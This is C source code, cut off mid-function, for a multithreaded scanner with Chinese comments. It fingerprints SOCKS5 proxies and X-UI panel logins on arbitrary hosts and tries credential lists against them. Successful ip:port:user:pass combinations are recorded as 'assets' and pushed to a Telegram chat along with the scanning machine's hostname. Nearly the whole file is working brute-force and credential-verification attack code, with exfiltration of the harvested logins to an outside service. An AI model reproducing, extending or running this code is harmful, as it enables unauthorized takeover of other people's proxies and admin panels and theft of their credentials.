#include "saia.h"
#include <poll.h>

static volatile int running_threads = 0;
static volatile int verify_running_threads = 0;
static volatile int feeding_in_progress = 0;
static volatile int pending_verify_tasks = 0;
static char progress_token[512] = "-";
static long long g_completion_report_start_offset = -1;
static FILE *g_report_fp = NULL;
static char g_report_path[MAX_PATH_LENGTH] = {0};

static long long file_size_bytes(const char *path);

typedef struct verify_task_s {
    char ip[64];
    uint16_t port;
    credential_t *creds;
    size_t cred_count;
    int work_mode;
    int xui_fingerprint_ok;
    int s5_fingerprint_ok;
    int s5_method;
    struct verify_task_s *next;
} verify_task_t;

static verify_task_t *verify_head = NULL;
static verify_task_t *verify_tail = NULL;
#ifdef _WIN32
static HANDLE lock_stats;
static HANDLE lock_file;
#define MUTEX_LOCK(x) WaitForSingleObject(x, INFINITE)
#define MUTEX_UNLOCK(x) ReleaseMutex(x)
#define MUTEX_INIT(x) x = CreateMutex(NULL, FALSE, NULL)
#else
static pthread_mutex_t lock_stats = PTHREAD_MUTEX_INITIALIZER;
static pthread_mutex_t lock_file = PTHREAD_MUTEX_INITIALIZER;
#define MUTEX_LOCK(x) pthread_mutex_lock(&x)
#define MUTEX_UNLOCK(x) pthread_mutex_unlock(&x)
#define MUTEX_INIT(x) // Static init is enough
#endif

#ifdef _WIN32
#define SAIA_STRTOK_R strtok_s
#else
#define SAIA_STRTOK_R strtok_r
#endif

#ifndef _WIN32
#define SAIA_ATOMIC_INC_INT(p) __sync_fetch_and_add((p), 1)
#define SAIA_ATOMIC_DEC_INT(p) __sync_fetch_and_sub((p), 1)
#define SAIA_ATOMIC_ADD_U64(p, v) __sync_fetch_and_add((p), (v))
#define SAIA_ATOMIC_LOAD_INT(p) __sync_fetch_and_add((p), 0)
#define SAIA_ATOMIC_LOAD_U64(p) __sync_fetch_and_add((p), 0)
#else
#define SAIA_ATOMIC_INC_INT(p) do { MUTEX_LOCK(lock_stats); (*(p))++; MUTEX_UNLOCK(lock_stats); } while (0)
#define SAIA_ATOMIC_DEC_INT(p) do { MUTEX_LOCK(lock_stats); (*(p))--; MUTEX_UNLOCK(lock_stats); } while (0)
#define SAIA_ATOMIC_ADD_U64(p, v) do { MUTEX_LOCK(lock_stats); (*(p)) += (v); MUTEX_UNLOCK(lock_stats); } while (0)
#define SAIA_ATOMIC_LOAD_INT(p) (*(p))
#define SAIA_ATOMIC_LOAD_U64(p) (*(p))
#endif

static int clamp_positive_threads(int threads) {
    return (threads > 0) ? threads : 1;
}

static int verify_reserved_threads(void) {
    int total = clamp_positive_threads(g_config.threads);
    int reserve = (total * 30 + 99) / 100; /* ceil(total * 0.3) */
    if (reserve < 1) reserve = 1;
    if (reserve > total) reserve = total;
    return reserve;
}

static void scanner_set_progress_token(const char *ip, uint16_t port, const char *user, const char *pass) {
    (void)ip;
    (void)port;
    (void)user;
    (void)pass;
    return;
}

static void scanner_report_write_line_locked(const char *line) {
    if (!line || !*line) return;
    if (!g_report_fp) {
        const char *rp = g_report_path[0] ? g_report_path : g_config.report_file;
        if (!rp || !*rp) return;
        g_report_fp = fopen(rp, "a");
        if (!g_report_fp) return;
    }
    fprintf(g_report_fp, "%s\n", line);
    fflush(g_report_fp);
}

// 初始化锁
void init_locks() {
    #ifdef _WIN32
    MUTEX_INIT(lock_stats);
    MUTEX_INIT(lock_file);
    #endif
}

// ==================== 验证逻辑: SOCKS5 ====================

static int socket_recv_exact(int fd, char *buf, size_t exact_size, int timeout_ms);

int verify_socks5(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
    int fd = socket_create(0);
    if (fd < 0) return 0;
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    if (socket_connect_timeout(fd, (struct sockaddr*)&addr, sizeof(addr), timeout_ms) != 0) {
        socket_close(fd);
        return 0;
    }
    
    // 1. 初始握手
    char handshake[] = {0x05, 0x01, 0x00}; // 无认证
    if (user && pass && strlen(user) > 0 && strcmp(user, "-") != 0) {
        handshake[2] = 0x02; // 用户名密码认证
    }
    
    if (socket_send_all(fd, handshake, sizeof(handshake), timeout_ms) < 0) {
        socket_close(fd);
        return 0;
    }
    
    char resp[2];
    if (socket_recv_exact(fd, resp, 2, timeout_ms) != 2) {
        socket_close(fd);
        return 0;
    }
    
    if (resp[0] != 0x05) {
        socket_close(fd);
        return 0;
    }
    
    // 2. 认证 (如果需要)
    if (resp[1] == 0x02) {
        if (!user || !pass || strcmp(user, "-") == 0) {
            socket_close(fd);
            return 0;
        }
        
        char auth_buf[600]; 
        int ulen = (int)strlen(user);
        int plen = (int)strlen(pass);
        if (ulen > 255) ulen = 255;
        if (plen > 255) plen = 255;
        int idx = 0;
        
        auth_buf[idx++] = 0x01; // Version
        auth_buf[idx++] = (char)ulen;
        memcpy(auth_buf + idx, user, ulen); idx += ulen;
        auth_buf[idx++] = (char)plen;
        memcpy(auth_buf + idx, pass, plen); idx += plen;
        
        if (socket_send_all(fd, auth_buf, idx, timeout_ms) < 0) {
            socket_close(fd);
            return 0;
        }
        
        char auth_resp[2];
        if (socket_recv_exact(fd, auth_resp, 2, timeout_ms) != 2) {
            socket_close(fd);
            return 0;
        }
        
        if (auth_resp[1] != 0x00) { // 认证失败
            socket_close(fd);
            return 0;
        }
    } else if (resp[1] != 0x00) {
        socket_close(fd);
        return 0; // 不支持的认证方法
    }
    
    // 3. 发送CONNECT请求到 1.1.1.1:80 (Cloudflare) 进行 L7 穿透测试
    char connect_req[] = {
        0x05, 0x01, 0x00, 0x01, // VER, CMD, RSV, ATYP(IPv4)
        0x01, 0x01, 0x01, 0x01, // 1.1.1.1
        0x00, 0x50              // Port 80
    };
    
    if (socket_send_all(fd, connect_req, sizeof(connect_req), timeout_ms) < 0) {
        socket_close(fd);
        return 0;
    }
    
    char conn_head[4];
    if (socket_recv_exact(fd, conn_head, 4, timeout_ms) != 4) {
        socket_close(fd);
        return 0;
    }
    
    if (conn_head[1] != 0x00) {
        socket_close(fd);
        return 0; // 连接被代理拒绝
    }

    int atyp = (unsigned char)conn_head[3];
    size_t addr_len = 0;
    if (atyp == 0x01) {
        addr_len = 4;
    } else if (atyp == 0x04) {
        addr_len = 16;
    } else if (atyp == 0x03) {
        unsigned char dlen = 0;
        if (socket_recv_exact(fd, (char *)&dlen, 1, timeout_ms) != 1) {
            socket_close(fd);
            return 0;
        }
        addr_len = (size_t)dlen;
    } else {
        socket_close(fd);
        return 0;
    }

    if (addr_len > 0) {
        char addr_buf[256];
        if (addr_len > sizeof(addr_buf) ||
            socket_recv_exact(fd, addr_buf, addr_len, timeout_ms) != (int)addr_len) {
            socket_close(fd);
            return 0;
        }
    }

    char bnd_port[2];
    if (socket_recv_exact(fd, bnd_port, 2, timeout_ms) != 2) {
        socket_close(fd);
        return 0;
    }
    
    // 4. 发起 L7 HTTP GET 请求，确认是否真实代理成功
    const char *http_req = "GET / HTTP/1.1\r\nHost: 1.1.1.1\r\nUser-Agent: curl/7.88.1\r\nConnection: close\r\n\r\n";
    if (socket_send_all(fd, http_req, strlen(http_req), timeout_ms) < 0) {
        socket_close(fd);
        return 0;
    }

    char http_resp[2048];
    int total = 0;
    while (total < (int)sizeof(http_resp) - 1) {
        int n = socket_recv_until(fd, http_resp + total,
                                  (sizeof(http_resp) - 1) - (size_t)total,
                                  NULL, timeout_ms);
        if (n <= 0) break;
        total += n;
        if (strstr(http_resp, "\r\n\r\n")) break;
    }
    socket_close(fd);

    if (total > 0) {
        http_resp[total] = '\0';
        // 只要收到任何合法 HTTP 响应就认为代理真实有效
        if (strstr(http_resp, "HTTP/1.1") || strstr(http_resp, "HTTP/1.0") ||
            strstr(http_resp, "cloudflare") || strstr(http_resp, "Cloudflare") ||
            strstr(http_resp, "301") || strstr(http_resp, "200") ||
            strstr(http_resp, "302") || strstr(http_resp, "403")) {
            return 1;
        }
    }
    return 0; // L7 返回特征不匹配，可能是伪造的 S5
}

// ==================== 验证逻辑: XUI ====================

// ==================== 验证逻辑: XUI ====================

static int contains_ci(const char *haystack, const char *needle) {
    if (!haystack || !needle || !*needle) return 0;
    size_t nlen = strlen(needle);
    for (const char *p = haystack; *p; p++) {
        size_t i = 0;
        while (i < nlen && p[i] && tolower((unsigned char)p[i]) == tolower((unsigned char)needle[i])) {
            i++;
        }
        if (i == nlen) return 1;
    }
    return 0;
}

/* 精确收包：直到读满 exact_size 或超时/断开 */
static int socket_recv_exact(int fd, char *buf, size_t exact_size, int timeout_ms) {
    if (fd < 0 || !buf || exact_size == 0) return -1;

    uint64_t start_ms = get_current_time_ms();
    size_t total = 0;
    while (total < exact_size) {
        uint64_t now_ms = get_current_time_ms();
        int remain_ms = timeout_ms;
        if (now_ms > start_ms) {
            uint64_t elapsed = now_ms - start_ms;
            if (elapsed >= (uint64_t)timeout_ms) break;
            remain_ms = timeout_ms - (int)elapsed;
        }

        struct pollfd pfd;
        memset(&pfd, 0, sizeof(pfd));
        pfd.fd = fd;
        pfd.events = POLLIN;
        int ready = poll(&pfd, 1, remain_ms);
        if (ready <= 0) break;

        int n = recv(fd, buf + total, exact_size - total, 0);
        if (n <= 0) break;
        total += (size_t)n;
    }

    return (int)total;
}

static void xui_build_url(char *out, size_t out_sz, const char *ip, uint16_t port, const char *path, int use_ssl) {
    snprintf(out, out_sz, "%s://%s:%d%s", use_ssl ? "https" : "http", ip, (int)port, path && *path ? path : "/");
}

static int xui_extract_location_path(const char *headers, char *out, size_t out_sz) {
    if (!headers || !out || out_sz == 0) return 0;
    out[0] = '\0';

    const char *p = headers;
    while (*p) {
        const char *line_end = strstr(p, "\r\n");
        size_t len = line_end ? (size_t)(line_end - p) : strlen(p);
        if (len >= 9 && (tolower((unsigned char)p[0]) == 'l')) {
            if ((len >= 9) &&
                tolower((unsigned char)p[0]) == 'l' &&
                tolower((unsigned char)p[1]) == 'o' &&
                tolower((unsigned char)p[2]) == 'c' &&
                tolower((unsigned char)p[3]) == 'a' &&
                tolower((unsigned char)p[4]) == 't' &&
                tolower((unsigned char)p[5]) == 'i' &&
                tolower((unsigned char)p[6]) == 'o' &&
                tolower((unsigned char)p[7]) == 'n' &&
                p[8] == ':') {
                const char *v = p + 9;
                while (*v == ' ' || *v == '\t') v++;
                if (strncmp(v, "http://", 7) == 0) {
                    v += 7;
                    while (*v && *v != '/' && *v != '\r' && *v != '\n') v++;
                } else if (strncmp(v, "https://", 8) == 0) {
                    v += 8;
                    while (*v && *v != '/' && *v != '\r' && *v != '\n') v++;
                } else if (strncmp(v, "//", 2) == 0) {
                    v += 2;
                    while (*v && *v != '/' && *v != '\r' && *v != '\n') v++;
                }
                if (*v == '/') {
                    size_t i = 0;
                    while (i + 1 < out_sz && v[i] && v + i < p + len && v[i] != '\r' && v[i] != '\n') {
                        out[i] = v[i];
                        i++;
                    }
                    out[i] = '\0';
                    return (i > 0);
                }
            }
        }
        if (!line_end) break;
        p = line_end + 2;
    }
    return 0;
}

static int xui_match_page_fingerprint(const http_response_t *res) {
    if (!res) return 0;
    const char *h = res->headers ? res->headers : "";
    const char *b = res->body ? res->body : "";

    if (contains_ci(h, "x-ui") || contains_ci(b, "x-ui") ||
        contains_ci(h, "3x-ui") || contains_ci(b, "3x-ui") ||
        contains_ci(h, "/xui") || contains_ci(b, "/xui")) {
        return 1;
    }

    if (contains_ci(h, "/login") || contains_ci(b, "/login")) {
        if (contains_ci(h, "username") || contains_ci(b, "username") ||
            contains_ci(h, "password") || contains_ci(b, "password") ||
            contains_ci(h, "signin") || contains_ci(b, "signin")) {
            return 1;
        }
    }

    if ((contains_ci(h, "/assets/ant-design-vue/antd.min.css") || contains_ci(b, "/assets/ant-design-vue/antd.min.css")) &&
        ((contains_ci(h, "/assets/css/custom.min.css") || contains_ci(b, "/assets/css/custom.min.css")) ||
         (contains_ci(h, "/assets/element-ui/theme-chalk/display.css") || contains_ci(b, "/assets/element-ui/theme-chalk/display.css")))) {
        return 1;
    }

    if ((contains_ci(h, "-welcome</title>") || contains_ci(b, "-welcome</title>")) &&
        (contains_ci(h, "/assets/js/") || contains_ci(b, "/assets/js/"))) {
        return 1;
    }

    return 0;
}

static int xui_auth_success(const http_response_t *res) {
    if (!res) return 0;
    const char *h = res->headers ? res->headers : "";
    const char *b = res->body ? res->body : "";

    if (contains_ci(b, "\"success\":true") || contains_ci(b, "\"success\": true")) return 1;
    if (contains_ci(h, "set-cookie: session=") || contains_ci(h, "set-cookie:session=")) return 1;
    if (contains_ci(h, "set-cookie: x-ui") || contains_ci(h, "set-cookie:x-ui")) return 1;
    if (res->status_code == 302 && contains_ci(h, "location: /panel")) return 1;

    return 0;
}

int verify_xui(const char *ip, uint16_t port, const char *user, const char *pass, int timeout_ms) {
    if (!ip || !*ip || !user || !pass) return 0;

    typedef struct { char path[96]; int ssl; } probe_t;
    typedef struct { char login_path[96]; int ssl; } candidate_t;

    probe_t probes[24];
    size_t probe_count = 0;
    candidate_t candidates[24];
    size_t cand_count = 0;

    probes[probe_count++] = (probe_t){"/", 0};
    probes[probe_count++] = (probe_t){"/login", 0};
    probes[probe_count++] = (probe_t){"/", 1};
    probes[probe_count++] = (probe_t){"/login", 1};

    for (size_t i = 0; i < probe_count && i < 24; i++) {
        char url[320];
        xui_build_url(url, sizeof(url), ip, port, probes[i].path, probes[i].ssl);
        http_response_t *res = http_get(url, timeout_ms);
        if (!res) continue;

        char loc_path[96];
        if (xui_extract_location_path(res->headers, loc_path, sizeof(loc_path))) {
            int exists = 0;
            for (size_t k = 0; k < probe_count; k++) {
                if (probes[k].ssl == probes[i].ssl && strcmp(probes[k].path, loc_path) == 0) {
                    exists = 1;
                    break;
                }
            }
            if (!exists && probe_count < 24) {
                snprintf(probes[probe_count].path, sizeof(probes[probe_count].path), "%s", loc_path);
                probes[probe_count].ssl = probes[i].ssl;
                probe_count++;
            }
        }

        if (xui_match_page_fingerprint(res)) {
            char login_path[96];
            if (contains_ci(probes[i].path, "login")) {
                snprintf(login_path, sizeof(login_path), "%s", probes[i].path);
            } else {
                if (strcmp(probes[i].path, "/") == 0) {
                    snprintf(login_path, sizeof(login_path), "/login");
                } else {
                    snprintf(login_path, sizeof(login_path), "%s/login", probes[i].path);
                }
            }

            int exists = 0;
            for (size_t c = 0; c < cand_count; c++) {
                if (candidates[c].ssl == probes[i].ssl && strcmp(candidates[c].login_path, login_path) == 0) {
                    exists = 1;
                    break;
                }
            }
            if (!exists && cand_count < 24) {
                snprintf(candidates[cand_count].login_path, sizeof(candidates[cand_count].login_path), "%s", login_path);
                candidates[cand_count].ssl = probes[i].ssl;
                cand_count++;
            }
        }

        http_response_free(res);
    }

    if (cand_count == 0) {
        const char *fallbacks[] = {"/login", "/xui/login", "/auth/login"};
        for (int ssl = 0; ssl <= 1; ssl++) {
            for (size_t j = 0; j < sizeof(fallbacks)/sizeof(fallbacks[0]); j++) {
                if (cand_count >= 24) break;
                snprintf(candidates[cand_count].login_path, sizeof(candidates[cand_count].login_path), "%s", fallbacks[j]);
                candidates[cand_count].ssl = ssl;
                cand_count++;
            }
        }
    }

    char data[768];
    snprintf(data, sizeof(data), "username=%s&password=%s", user, pass);

    for (size_t c = 0; c < cand_count; c++) {
        char login_url[320];
        xui_build_url(login_url, sizeof(login_url), ip, port, candidates[c].login_path, candidates[c].ssl);
        http_response_t *res = http_post(login_url, data, timeout_ms);
        if (!res) continue;
        int ok = xui_auth_success(res);
        http_response_free(res);
        if (ok) return 1;
    }

    return 0;
}

// ==================== 多线程调度 ====================

// 线程参数
typedef struct {
    char ip[64];
    uint16_t port;
    credential_t *creds;
    size_t cred_count;
    int work_mode;
    int xui_fingerprint_ok;
    int s5_fingerprint_ok;
    int s5_method;
} worker_arg_t;

typedef struct worker_arg_pool_s {
    worker_arg_t item;
    struct worker_arg_pool_s *next;
} worker_arg_pool_t;

static worker_arg_pool_t *g_worker_arg_pool = NULL;
static int g_worker_arg_pool_size = 0;
#define WORKER_ARG_POOL_MAX 16384

#define SCAN_TASK_QUEUE_CAP 10000
static worker_arg_t *g_scan_task_queue[SCAN_TASK_QUEUE_CAP];
static size_t g_scan_q_head = 0;
static size_t g_scan_q_tail = 0;
static size_t g_scan_q_size = 0;
static volatile int g_scan_producer_done = 0;
static int g_scan_worker_total = 0;

static worker_arg_t *worker_arg_acquire(void) {
    worker_arg_t *out = NULL;
    MUTEX_LOCK(lock_stats);
    if (g_worker_arg_pool) {
        worker_arg_pool_t *n = g_worker_arg_pool;
        g_worker_arg_pool = n->next;
        if (g_worker_arg_pool_size > 0) g_worker_arg_pool_size--;
        out = &n->item;
    }
    MUTEX_UNLOCK(lock_stats);

    if (!out) {
        worker_arg_pool_t *n = (worker_arg_pool_t *)calloc(1, sizeof(worker_arg_pool_t));
        if (!n) return NULL;
        out = &n->item;
    }

    memset(out, 0, sizeof(*out));
    return out;
}

static void worker_arg_release(worker_arg_t *arg) {
    if (!arg) return;
    worker_arg_pool_t *node = (worker_arg_pool_t *)arg;

    MUTEX_LOCK(lock_stats);
    if (g_worker_arg_pool_size < WORKER_ARG_POOL_MAX) {
        node->next = g_worker_arg_pool;
        g_worker_arg_pool = node;
        g_worker_arg_pool_size++;
        MUTEX_UNLOCK(lock_stats);
        return;
    }
    MUTEX_UNLOCK(lock_stats);

    free(node);
}

static void scan_queue_reset(void) {
    MUTEX_LOCK(lock_stats);
    g_scan_q_head = 0;
    g_scan_q_tail = 0;
    g_scan_q_size = 0;
    g_scan_producer_done = 0;
    g_scan_worker_total = 0;
    MUTEX_UNLOCK(lock_stats);
}

static void worker_arg_pool_prefill(size_t target_count) {
    if (target_count > WORKER_ARG_POOL_MAX) target_count = WORKER_ARG_POOL_MAX;
    while (1) {
        MUTEX_LOCK(lock_stats);
        int cur = g_worker_arg_pool_size;
        MUTEX_UNLOCK(lock_stats);
        if ((size_t)cur >= target_count) break;

        worker_arg_pool_t *n = (worker_arg_pool_t *)calloc(1, sizeof(worker_arg_pool_t));
        if (!n) break;

        MUTEX_LOCK(lock_stats);
        n->next = g_worker_arg_pool;
        g_worker_arg_pool = n;
        g_worker_arg_pool_size++;
        MUTEX_UNLOCK(lock_stats);
    }
}

static int scan_queue_push(worker_arg_t *task) {
    int ok = 0;
    MUTEX_LOCK(lock_stats);
    if (g_scan_q_size < SCAN_TASK_QUEUE_CAP) {
        g_scan_task_queue[g_scan_q_tail] = task;
        g_scan_q_tail = (g_scan_q_tail + 1) % SCAN_TASK_QUEUE_CAP;
        g_scan_q_size++;
        ok = 1;
    }
    MUTEX_UNLOCK(lock_stats);
    return ok;
}

static worker_arg_t *scan_queue_pop(void) {
    worker_arg_t *task = NULL;
    MUTEX_LOCK(lock_stats);
    if (g_scan_q_size > 0) {
        task = g_scan_task_queue[g_scan_q_head];
        g_scan_q_head = (g_scan_q_head + 1) % SCAN_TASK_QUEUE_CAP;
        g_scan_q_size--;
    }
    MUTEX_UNLOCK(lock_stats);
    return task;
}

static size_t scan_queue_size(void) {
    size_t n;
    MUTEX_LOCK(lock_stats);
    n = g_scan_q_size;
    MUTEX_UNLOCK(lock_stats);
    return n;
}

static void scanner_report_found_open(const worker_arg_t *task) {
    if (!task) return;
    if (g_config.scan_mode == SCAN_EXPLORE) return;
    char result_line[1024];
    const char *tag = "[PORT_OPEN]";
    const char *detail = "端口开放";
    const char *cand_type = NULL;

    if (task->work_mode == MODE_S5) {
        if (task->s5_fingerprint_ok > 0) {
            tag = "[S5_FOUND]";
            cand_type = "s5";
            if (task->s5_method == 0x00) {
                detail = "[节点-可连通] S5-OPEN";
            } else if (task->s5_method == 0x02) {
                detail = "[资产-加密节点] S5-AUTH";
            } else if (task->s5_method == 0xFF) {
                detail = "[节点-可连通] S5-UNSUPPORTED-METHOD";
            } else {
                detail = "端口开放 + S5特征命中";
            }
        } else {
            tag = "[PORT_OPEN]";
            detail = "端口开放(无S5特征)";
        }
    } else if (task->work_mode == MODE_DEEP) {
        if (task->xui_fingerprint_ok > 0) {
            tag = "[XUI_FOUND]";
            cand_type = "xui";
            detail = "端口开放 + XUI特征命中";
        } else if (task->s5_fingerprint_ok > 0) {
            tag = "[S5_FOUND]";
            cand_type = "s5";
            if (task->s5_method == 0x00) {
                detail = "[节点-可连通] S5-OPEN";
            } else if (task->s5_method == 0x02) {
                detail = "[资产-加密节点] S5-AUTH";
            } else if (task->s5_method == 0xFF) {
                detail = "[节点-可连通] S5-UNSUPPORTED-METHOD";
            } else {
                detail = "端口开放 + S5特征命中";
            }
        } else {
            tag = "[PORT_OPEN]";
            detail = "端口开放(无XUI/S5特征)";
        }
    } else if (task->work_mode == MODE_XUI) {
        if (task->xui_fingerprint_ok > 0) {
            tag = "[XUI_FOUND]";
            cand_type = "xui";
            detail = "端口开放 + XUI特征命中";
        } else {
            tag = "[PORT_OPEN]";
            detail = "端口开放(无XUI特征)";
        }
    }

    snprintf(result_line, sizeof(result_line),
             "%s %s:%d | %s",
             tag, task->ip, task->port, detail);
    MUTEX_LOCK(lock_file);
    scanner_report_write_line_locked(result_line);

    if (cand_type) {
        char stage1_file[MAX_PATH_LENGTH];
        snprintf(stage1_file, sizeof(stage1_file), "%s/stage1_candidates.list", g_config.base_dir);
        char stage_line[256];
        snprintf(stage_line, sizeof(stage_line), "%s:%d|type=%s|source=stage1\n",
                 task->ip, task->port, cand_type);
        file_append(stage1_file, stage_line);
    }

    printf("\n%s%s%s\n", C_CYAN, result_line, C_RESET);
    MUTEX_UNLOCK(lock_file);
}

static int xui_has_required_fingerprint(const char *ip, uint16_t port, int timeout_ms) {
    const char *paths[] = {"/", "/login"};
    for (int ssl = 0; ssl <= 1; ssl++) {
        for (size_t i = 0; i < sizeof(paths)/sizeof(paths[0]); i++) {
            char url[320];
            xui_build_url(url, sizeof(url), ip, port, paths[i], ssl);
            http_response_t *res = http_get(url, timeout_ms);
            if (!res) continue;
            int ok = xui_match_page_fingerprint(res);
            if (!ok) {
                char loc_path[96];
                if (xui_extract_location_path(res->headers, loc_path, sizeof(loc_path))) {
                    char u2[320];
                    xui_build_url(u2, sizeof(u2), ip, port, loc_path, ssl);
                    http_response_t *res2 = http_get(u2, timeout_ms);
                    if (res2) {
                        ok = xui_match_page_fingerprint(res2);
                        http_response_free(res2);
                    }
                }
            }
            http_response_free(res);
            if (ok) return 1;
        }
    }
    return 0;
}

static int s5_has_required_fingerprint(const char *ip, uint16_t port, int timeout_ms, int *method_out) {
    if (method_out) *method_out = -1;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    for (int attempt = 0; attempt < 2; attempt++) {
        int fd = socket_create(0);
        if (fd < 0) return 0;

        if (socket_connect_timeout(fd, (struct sockaddr*)&addr, sizeof(addr), timeout_ms) != 0) {
            socket_close(fd);
            continue;
        }

        /* 提供 no-auth + user/pass 两种方法，识别标准 SOCKS5 协商回应 */
        char hello[] = {0x05, 0x02, 0x00, 0x02};
        if (socket_send_all(fd, hello, sizeof(hello), timeout_ms) < 0) {
            socket_close(fd);
            continue;
        }

        char resp[2];
        int n = socket_recv_exact(fd, resp, 2, timeout_ms);
        socket_close(fd);
        if (n != 2) continue;

        if ((unsigned char)resp[0] != 0x05) continue;

        int method = (int)(unsigned char)resp[1];
        if (method_out) *method_out = method;
        /* 标准档：接受 0x00/0x02/0xFF（服务存在但方法不匹配） */
        if (method == 0x00 || method == 0x02 || method == 0xFF) {
            return 1;
        }
    }

    return 0;
}

static int should_push_verified_now(uint64_t total_verified) {
    if (!g_config.telegram_enabled) return 0;
    int threshold = g_config.telegram_verified_threshold;
    if (threshold <= 1) return 1;
    if (total_verified == 0) return 0;
    return (total_verified % (uint64_t)threshold) == 0;
}

static const char *mode_report_label(int mode) {
    if (mode == MODE_S5) return "S5";
    if (mode == MODE_XUI) return "XUI";
    if (mode == MODE_DEEP) return "混合";
    if (mode == MODE_VERIFY) return "验真";
    return "未知";
}

static void append_server_marker(char *buf, size_t cap) {
    if (!buf || cap == 0) return;
    char host[128] = "unknown";
#ifdef _WIN32
    DWORD sz = (DWORD)(sizeof(host) - 1);
    if (GetComputerNameA(host, &sz) == 0) {
        snprintf(host, sizeof(host), "unknown");
    }
#else
    if (gethostname(host, sizeof(host) - 1) != 0) {
        snprintf(host, sizeof(host), "unknown");
    }
#endif
    host[sizeof(host) - 1] = '\0';
    size_t n = strlen(buf);
    snprintf(buf + n, (n < cap) ? cap - n : 0,
             "\n\n服务器:%s | PID:%d", host, (int)g_state.pid);
}

static int is_verified_report_line(const char *s) {
    if (!s) return 0;
    return (strstr(s, "[XUI_VERIFIED]") != NULL) ||
           (strstr(s, "[S5_VERIFIED]") != NULL) ||
           (strstr(s, "[VERIFIED]") != NULL);
}

static void format_verified_from_report_line(const char *line, char *out, size_t out_sz) {
    if (!out || out_sz == 0) return;
    out[0] = '\0';
    if (!line) {
        snprintf(out, out_sz, "-");
        return;
    }

    char ip_port[64] = "-";
    char user[128] = "-";
    char pass[128] = "-";
    char asn[32] = "-";

    const char *p = line;
    while (*p) {
        unsigned a, b, c, d, port;
        if (sscanf(p, "%u.%u.%u.%u:%u", &a, &b, &c, &d, &port) == 5) {
            if (a <= 255 && b <= 255 && c <= 255 && d <= 255 && port <= 65535) {
                snprintf(ip_port, sizeof(ip_port), "%u.%u.%u.%u:%u", a, b, c, d, port);
                break;
            }
        }
        p++;
    }

    const char *u = strstr(line, "账号:");
    if (u) {
        u += 5;
        size_t i = 0;
        while (u[i] && u[i] != '|' && !isspace((unsigned char)u[i]) && i + 1 < sizeof(user)) {
            user[i] = u[i];
            i++;
        }
        user[i] = '\0';
    }

    const char *pw = strstr(line, "密码:");
    if (pw) {
        pw += 5;
        size_t i = 0;
        while (pw[i] && pw[i] != '|' && !isspace((unsigned char)pw[i]) && i + 1 < sizeof(pass)) {
            pass[i] = pw[i];
            i++;
        }
        pass[i] = '\0';
    }

    const char *ap = strstr(line, "AS");
    if (ap) {
        size_t i = 0;
        asn[i++] = 'A';
        asn[i++] = 'S';
        ap += 2;
        while (*ap && isdigit((unsigned char)*ap) && i + 1 < sizeof(asn)) {
            asn[i++] = *ap++;
        }
        asn[i] = '\0';
        if (i <= 2) snprintf(asn, sizeof(asn), "-");
    }

    if (strchr(user, ':') && strchr(pass, ':') && strcmp(user, pass) == 0) {
        snprintf(out, out_sz, "%s:%s %s", ip_port, user, asn);
    } else {
        snprintf(out, out_sz, "%s:%s:%s %s", ip_port, user, pass, asn);
    }
}

static void send_completion_verified_report(void) {
    if (!g_config.telegram_token[0] || !g_config.telegram_chat_id[0]) {
        printf("[TG] 完成推送已跳过: token/chat_id 未配置\n");
        return;
    }

    char path[MAX_PATH_LENGTH];
    if (g_config.report_file[0]) {
        snprintf(path, sizeof(path), "%s", g_config.report_file);
    } else {
        snprintf(path, sizeof(path), "%s/audit_report.log", g_config.base_dir);
    }
    long long start_off = g_completion_report_start_offset;
    if (start_off < 0) start_off = 0;

    FILE *fp = fopen(path, "rb");
    if (!fp) {
        char msg[768];
        snprintf(msg, sizeof(msg), "验真完成 | 模式:%s | 条数:0\n暂无验真数据", mode_report_label(g_state.mode));
        append_server_marker(msg, sizeof(msg));
        send_telegram_message(g_config.telegram_token, g_config.telegram_chat_id, msg);
        return;
    }

    uint64_t verified = 0;
    if (start_off > 0) {
        if (fseek(fp, 0, SEEK_END) == 0) {
            long end_pos = ftell(fp);
            if (end_pos > 0 && (long long)end_pos > start_off) {
                (void)fseek(fp, (long)start_off, SEEK_SET);
            } else {
                (void)fseek(fp, 0, SEEK_END);
            }
        }
    }

    char line[4096];
    while (fgets(line, sizeof(line), fp)) {
        if (is_verified_report_line(line)) verified++;
    }
    fclose(fp);

    char summary[512];
    snprintf(summary, sizeof(summary),
             "验真完成 | 模式:%s | 条数:%llu",
             mode_report_label(g_state.mode),
             (unsigned long long)verified);

    if (verified == 0) {
        char none_msg[512];
        snprintf(none_msg, sizeof(none_msg), "%s\n暂无验真数据", summary);
        append_server_marker(none_msg, sizeof(none_msg));
        send_telegram_message(g_config.telegram_token, g_config.telegram_chat_id, none_msg);
        return;
    }

    fp = fopen(path, "rb");
    if (!fp) return;

    if (start_off > 0) {
        if (fseek(fp, 0, SEEK_END) == 0) {
            long end_pos = ftell(fp);
            if (end_pos > 0 && (long long)end_pos > start_off) {
                (void)fseek(fp, (long)start_off, SEEK_SET);
            } else {
                fclose(fp);
                return;
            }
        }
    } else {
        (void)fseek(fp, 0, SEEK_SET);
    }

    char chunk[3600];
    snprintf(chunk, sizeof(chunk), "%s", summary);

    while (fgets(line, sizeof(line), fp)) {
        if (!is_verified_report_line(line)) continue;

        char one[256];
        format_verified_from_report_line(line, one, sizeof(one));

        size_t need = strlen(chunk) + strlen(one) + 1;
        if (need >= sizeof(chunk) - 64) {
            append_server_marker(chunk, sizeof(chunk));
            send_telegram_message(g_config.telegram_token, g_config.telegram_chat_id, chunk);
            snprintf(chunk, sizeof(chunk), "%s", one);
            continue;
        }

        if (strlen(chunk) > 0) {
            strncat(chunk, "\n", sizeof(chunk) - strlen(chunk) - 1);
        }
        strncat(chunk, one, sizeof(chunk) - strlen(chunk) - 1);
    }
    fclose(fp);

    if (strlen(chunk) > 0) {
        append_server_marker(chunk, sizeof(chunk));
        send_telegram_message(g_config.telegram_token, g_config.telegram_chat_id, chunk);
    }
}

void scanner_send_completion_report(void) {
    send_completion_verified_report();
}

void scanner_begin_completion_window(void) {
    const char *report_path = g_config.report_file[0] ? g_config.report_file : NULL;
    if (!report_path || !*report_path) {
        static char fallback_report[MAX_PATH_LENGTH];
        snprintf(fallback_report, sizeof(fallback_report), "%s/audit_report.log", g_config.base_dir);
